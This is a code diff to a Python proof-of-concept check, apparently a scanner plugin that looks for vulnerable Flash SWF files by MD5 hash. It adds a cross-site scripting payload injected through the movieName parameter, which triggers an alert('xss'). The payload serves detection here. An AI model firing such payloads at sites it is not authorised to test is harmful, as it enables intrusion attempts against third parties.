@@ -34,14 +34,15 @@ def poc(url):
     ]
     result = []
     for payload in FileList:
+        payload1 = payload + "?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//"
         try:
             header = dict()
             header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-            r = requests.get(payload, headers=header, timeout=5)
+            r = requests.get(payload1, headers=header, timeout=5)
             if r.status_code == 200:
                 md5_value = md5.new(r.content).hexdigest()
                 if md5_value in md5_list:
-                    result.append(payload)
+                    result.append("[flash xss] " + payload1)
         except Exception:
             return False
     if result:
